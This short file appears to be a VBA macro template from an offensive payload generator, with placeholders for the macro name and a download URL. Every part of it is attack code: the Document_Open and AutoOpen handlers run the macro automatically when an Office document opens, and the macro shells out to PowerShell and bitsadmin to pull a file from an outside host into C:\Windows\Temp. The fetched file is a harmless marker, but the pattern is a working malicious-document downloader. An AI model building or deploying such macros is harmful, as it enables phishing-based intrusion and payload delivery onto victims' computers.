Sub {MACRO_NAME}()
    Dim str As String
    str = "powershell -NoExit -Command ""bitsadmin.exe /Transfer myJob {HTTP_URL}/___hello_from_vbaShell_via_bitsadmin_via_PS___.txt C:\Windows\Temp\out.txt"" "
    Shell str, vbNormalFocus
End Sub

Sub Document_Open()
    {MACRO_NAME}
End Sub

Sub AutoOpen()
    {MACRO_NAME}
End Sub